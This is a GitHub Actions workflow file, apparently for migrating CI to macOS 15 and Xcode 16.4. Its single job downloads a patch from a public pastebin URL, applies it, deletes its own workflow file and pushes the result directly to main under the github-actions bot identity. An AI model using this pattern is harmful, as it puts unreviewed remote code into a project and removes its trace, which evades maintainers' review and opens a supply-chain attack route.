name: Apply CI runner migration

on:
  push:
    branches:
      - ci/apply-macos15-xcode16
  workflow_dispatch:

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout temp branch
        uses: actions/checkout@v4
        with:
          ref: ci/apply-macos15-xcode16
          fetch-depth: 0

      - name: Apply verified patch and push main
        run: |
          set -euo pipefail
          curl -fsSL "https://paste.rs/Ao1uQ" -o /tmp/ci-macos15.patch
          git apply --check /tmp/ci-macos15.patch
          git apply /tmp/ci-macos15.patch
          rm .github/workflows/apply-ci-runner-fix.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "fix(ci): 迁移生产构建与 CI 到 macOS 15 / Xcode 16.4"
          git fetch origin main
          git rebase origin/main
          git push origin HEAD:main
